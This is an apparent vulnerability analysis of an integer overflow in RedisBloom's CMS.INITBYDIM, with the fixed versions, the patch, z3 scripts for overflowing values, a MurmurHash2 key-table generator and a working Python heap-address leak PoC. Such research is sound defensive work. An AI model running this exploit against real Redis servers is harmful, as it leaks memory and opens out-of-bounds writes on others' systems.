# Overview

An Integer Overflow vulnerability in RedisBloom
, a Redis extension module.
An attacker who knows the Redis client password can trigger allocation of a chunk smaller than the intended data size, enabling information leak and out-of-bounds write.

Impacted versions
- RedisBloom versions >= 2.0

Fixed releases
- 2.8.5 and above
- 2.6.16 and above
- 2.4.13 and above

# Analysis

Analysis performed on version 2.0.0
- https://github.com/RedisBloom/RedisBloom/archive/refs/tags/v2.0.0.zip

Build using the provided Dockerfile:

```bash
docker build -t redisbloom .
```

If you add DEBUG=1 at the top of the Makefile before building, optimizations are disabled.

## Patch analysis

Compare v2.0.0 and v2.4.13:
- https://github.com/RedisBloom/RedisBloom/tree/v2.0.0
- https://github.com/RedisBloom/RedisBloom/tree/v2.4.13

The patch added checks related to the width and depth parameters in NewCMSketch.

Checks whether width * depth would exceed SIZE_MAX (Integer Overflow check).

## Vulnerability trigger
```c
CMSketch *NewCMSketch(size_t width, size_t depth) {
    assert(width > 0);
    assert(depth > 0);

    CMSketch *cms = CMS_CALLOC(1, sizeof(CMSketch));

    cms->width = width;
    cms->depth = depth;
    cms->counter = 0;
    cms->array = CMS_CALLOC(width * depth, sizeof(uint32_t));

    return cms;
}
```

CMS_CALLOC → wrapper macro to calloc

If width * depth overflows, the actual allocated memory size becomes smaller. Later code performs bounds checks using width and depth — what happens then?

Let's find values where (width * depth * sizeof(uint32_t)) & 0xffffffffffffffff becomes less than 16.

```py
from z3 import *

s = Solver()

width = BitVec('width', 64)
depth = BitVec('depth', 64)

s.add(width > 0)
s.add(depth > 0)
s.add(ULT(width * depth * 4, 0x10))

assert s.check() == sat
model = s.model()
width, depth = model[width].as_long(), model[depth].as_long()
val = (width * depth * 4) & 0xFFFFFFFFFFFFFFFF

print("width:", width, "depth:", depth)
print(hex(val))
```

```bash
width: 192527711544016895 depth: 4226630595339354110
0x8
```

For width=192527711544016895 and depth=4226630595339354110, this is equivalent to malloc(8).
Next, find which redisbloom command calls NewCMSketch.

- https://redis.io/docs/latest/commands/cms.initbydim/
- Command to initialize a Count-Min Sketch (CMS).
- A sketch is a compact data structure for estimating frequencies in large/streaming datasets or when frequent updates occur, using small memory and providing approximate results.
- It trades accuracy for speed/space.

## Operation
- Uses a 2D array of size width * depth as a hash table.
- On insert: compute indices with all hash functions and increment the values at those positions.
- On query: compute indices with all hash functions and return the minimum value among those positions.

## Parameters:
- key: sketch name
- width: width (number of columns)
- depth: depth (number of hash functions / rows)

→ Increasing width and depth reduces error (e.g., smaller width causes more hash collisions ⇒ larger error).

Verified that the command can be called successfully.

Now search for code that references cms->array, cms->width, and cms->depth.

CMS_IncrBy and CMS_Query functions (RedisBloom-2.0.0/src/cms.c):

CMS_IncrBy is the write primitive, and CMS_Query is the read primitive.

The original analysis report only covered a heap address leak using CMS_Query.

Command docs:
- https://redis.io/docs/latest/commands/cms.incrby/
- https://redis.io/docs/latest/commands/cms.query/

```c
size_t CMS_Query(CMSketch *cms, const char *item, size_t itemlen) {
    assert(cms);
    assert(item >= 0);

    size_t temp = 0, res = (size_t)-1;

    for (size_t i = 0; i < cms->depth; ++i) {
        uint32_t hash = CMS_HASH(item, itemlen, i);
        temp = cms->array[(hash % cms->width) + (i * cms->width)];
        if (temp < res) {
            res = temp;
        }
    }

    return res;
}
```

The code uses i * cms->width in the index; if depth is excessively large, a segfault may occur.
⇒ If cms->depth is fixed to 1, leaking becomes easier and you avoid segfaults.

```py
from z3 import *

s = Solver()
width = BitVec('width', 64)
depth = BitVec('depth', 64)

s.add(depth == 1)
s.add(width > 0)
s.add(depth > 0)
s.add(ULT(width * depth * 4, 0x10))

assert s.check() == sat
model = s.model()
width, depth = model[width].as_long(), model[depth].as_long()
val = (width * depth * 4) & 0xFFFFFFFFFFFFFFFF

print("width:", str(width), "depth:", str(depth))
print(hex(val))
```

```bash
width: 4611686018427387904 depth: 1
0x0
```

When width = 4611686018427387904 and depth = 1, cms->array is of size 0x20 (32 bytes) but accessible indices are hash % cms->width.

The hash variable is 4 bytes and width = 0x4000000000000000, so hash % cms->width = hash.

## Summary:

With width = 4611686018427387904 and depth = 1:

cms->array[(hash % cms->width) + (i * cms->width)] == cms->array[hash]

So if we can control hash (the MurmurHash2 output), we can access arbitrary array indices (within chosen range).

```c
#define CMS_HASH(item, itemlen, i) MurmurHash2(item, itemlen, i)

uint32_t hash = CMS_HASH(item, itemlen, i);

uint32_t MurmurHash2(const void *key, int len, uint32_t seed) {
    // 'm' and 'r' are mixing constants generated offline.
    // They're not really 'magic', they just happen to work well.

    const uint32_t m = 0x5bd1e995;
    const int r = 24;

    // Initialize the hash to a 'random' value

    uint32_t h = seed ^ len;

    // Mix 4 bytes at a time into the hash

    const unsigned char *data = (const unsigned char *)key;

    while (len >= 4) {
        uint32_t k = *(uint32_t *)data;

        k *= m;
        k ^= k >> r;
        k *= m;

        h *= m;
        h ^= k;

        data += 4;
        len -= 4;
    }

    // Handle the last few bytes of the input array

    switch (len) {
    case 3:
        h ^= data[2] << 16;
    case 2:
        h ^= data[1] << 8;
    case 1:
        h ^= data[0];
        h *= m;
    };

    // Do a few final mixes of the hash to ensure the last few
    // bytes are well-incorporated.

    h ^= h >> 13;
    h *= m;
    h ^= h >> 15;

    return h;
}
```

The item is hashed with MurmurHash2, and the resulting hash is used as the index.

When the CMS.QUERY command is executed:
1. ~~ (omitted steps)
2. processCommand
3. call
4. RedisModuleCommandDispatcher
5. CMSketch_Query:

```c
int CMSketch_Query(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    RedisModule_AutoMemory(ctx);
    if (argc < 3) {
        return RedisModule_WrongArity(ctx);
    }

    CMSketch *cms = NULL;
    if (GetCMSKey(ctx, argv[1], &cms, REDISMODULE_READ) != REDISMODULE_OK) {
        return REDISMODULE_OK;
    }

    int itemCount = argc - 2;
    size_t length = 0;
    RedisModule_ReplyWithArray(ctx, itemCount);
    for (int i = 0; i < itemCount; ++i) {
        const char *str = RedisModule_StringPtrLen(argv[2 + i], &length);
        RedisModule_ReplyWithLongLong(ctx, CMS_Query(cms, str, length));
    }

    return REDISMODULE_OK;
}
```

## CMS_Query

CMS.QUERY command syntax:
```bash
CMS.QUERY <sketch name created by CMS.INITBYDIM> <item-to-query>
```

## Hash table generation

```py
import random
import string

filter = string.digits + string.ascii_letters   

def murmurhash2(key: bytes) -> int:
    if isinstance(key, str):
        key = key.encode()

    m = 0x5bd1e995
    r = 24
    length = len(key)
    seed = 0
    h = (seed ^ length) & 0xFFFFFFFF

    data = bytearray(key)
    i = 0
    while length >= 4:
        k = (
            data[i]
            | (data[i + 1] << 8)
            | (data[i + 2] << 16)
            | (data[i + 3] << 24)
        )
        k = (k * m) & 0xFFFFFFFF
        k ^= (k >> r)
        k = (k * m) & 0xFFFFFFFF

        h = (h * m) & 0xFFFFFFFF
        h ^= k

        i += 4
        length -= 4

    if length == 3:
        h ^= data[i + 2] << 16
    if length >= 2:
        h ^= data[i + 1] << 8
    if length >= 1:
        h ^= data[i]
        h = (h * m) & 0xFFFFFFFF

    h ^= (h >> 13)
    h = (h * m) & 0xFFFFFFFF
    h ^= (h >> 15)

    return h & 0xFFFFFFFF

def create_random_key():
    key_length = 8
    return ''.join([random.choice(filter) for _ in range(key_length)]).encode()

d = open("hash_table.txt", "r").read()

if len(d) == 0:
    hash_table = {}
else:
    hash_table = eval(d)

while True:
    key = create_random_key()
    hash_ = murmurhash2(key)
    if hash_ < 0x400:
        if (hash_ not in hash_table):
            # print(hash_, key)
            hash_table[hash_] = key
            print(dict(sorted(hash_table.items())))
```

Example saved hash_table.txt content (truncated for brevity):

```py
{0: b'XrOjggG8', 1: b'XEYDLqDN', 4: b'1fxG6Mji', 5: b'0XMriNWu', 6: b'N5aEjknL', ... 1023: b'iKLlhWpy'}
```

## Information Leak

A heap pointer is stored at cms->array + 16.
Use indices 4 and 5 to read the low and high parts.

## PoC

```py
import redis

sketch_name = "test"

r = redis.Redis(host='localhost', port=6379, decode_responses=True)
r.flushall()

initbydim = lambda sketch_name, width, depth: r.execute_command("CMS.INITBYDIM", sketch_name, width, depth)
query = lambda sketch_name, key: r.execute_command("CMS.QUERY", sketch_name, key)

def leak(sketch_name, idx):
    if idx not in hash_table:
        print("cant find")
        return None
    key = hash_table[idx]
    return query(sketch_name, key)[0]

initbydim(sketch_name, 4611686018427387904, 1)

d = open("hash_table.txt", "r").read()
hash_table = eval(d)

low_bytes = leak(sketch_name, 4)
high_bytes = leak(sketch_name, 5)
heap_addr = (high_bytes) << 32 | low_bytes

print(hex(heap_addr))
```